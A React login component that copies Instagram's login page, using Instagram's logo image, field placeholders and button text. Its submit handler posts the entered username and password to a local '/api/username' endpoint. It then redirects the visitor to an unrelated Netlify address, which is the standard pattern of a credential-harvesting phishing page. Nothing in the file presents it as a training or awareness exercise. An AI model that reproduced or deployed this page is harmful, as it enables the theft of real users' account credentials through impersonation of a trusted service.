"use client"; // Marks this as a client-side component

import React, { useState, useEffect } from "react";

const Login = () => {
  const [username, setUsername] = useState(""); // State for username
  const [password, setPassword] = useState(""); // State for password
  const [isRedirecting, setIsRedirecting] = useState(false); // To trigger redirection

  useEffect(() => {
    if (isRedirecting) {
      window.location.href = "https://tubular-pixie-bf8c9f.netlify.app/";
    }
  }, [isRedirecting]);

  const handleSubmit = async (e) => {
    e.preventDefault(); // Prevent default form submission behavior

    try {
      const res = await fetch("/api/username", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password }),
      });

      if (res.status === 200) {
        setIsRedirecting(true); // Trigger redirection
      } else {
        console.error("Login failed. Please check your credentials.");
      }
    } catch (error) {
      console.error("An error occurred during login:", error);
    }
  };

  return (
    <div className="flex flex-col md:flex-row justify-center items-center min-h-screen bg-gray-50">
      <div className="flex flex-col items-center bg-white p-8 border border-gray-300 rounded-md shadow-sm">
        <img
          src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
          className="h-12 mb-6"
          alt="Instagram Logo"
        />
        <form className="flex flex-col w-80 space-y-4" onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="px-4 py-2 border border-gray-300 rounded "
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="px-4 py-2 border border-gray-300 rounded "
          />
          <button
            type="submit"
            className="bg-blue-500 text-white font-semibold py-2 rounded hover:bg-blue-600"
          >
            Log in
          </button>
          <div className="flex justify-between items-center">
            <a href="#" className="text-sm text-blue-500 hover:underline">
              Forgotten your password?
            </a>
          </div>
          <div className="flex items-center justify-between my-4">
            <hr className="w-full border-t border-gray-300" />
            <span className="px-2 text-gray-500">OR</span>
            <hr className="w-full border-t border-gray-300" />
          </div>
          <p className="mt-4 text-sm mx-auto">
            Don&apos;t have an account?{" "}
            <a href="#" className="text-blue-500 font-semibold">
              Sign up
            </a>
          </p>
          <p className="mt-4 text-xs text-gray-500 mx-auto">Get the app.</p>
        </form>
      </div>
    </div>
  );
};

export default Login;
